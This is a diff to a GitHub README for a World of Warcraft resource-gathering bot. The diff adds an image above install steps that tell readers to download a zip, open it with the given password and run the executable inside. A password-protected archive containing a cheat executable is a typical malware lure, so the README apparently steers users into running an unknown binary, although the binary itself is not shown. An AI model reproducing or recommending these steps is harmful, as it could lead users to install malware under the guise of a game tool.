@@ -11,6 +11,7 @@ The WoW Resource Gathering Bot is a cutting-edge solution aimed at enhancing you
 - 🔍 **Guidance and Techniques:** Valuable suggestions and tactics to boost your efficiency with the bot, steering you towards quicker success.
 
 ## 🛠️ Getting Started
+![image](https://github.com/user-attachments/assets/34f4b838-0c57-4da7-9ba4-25edd5c813bd)
 1. Download the most recent version of the WoW resource gathering bot or [click](https://github.com/Jyilty/World-of-Warcraft-autofarm-bot/releases/download/Release/WoW.autofarm.bot.zip).
 2. Unzip the files. The zip password is: **AzerothHarvest**
 3. Launch the application found in the extracted folder `WoW_autofarm_bot.exe`.
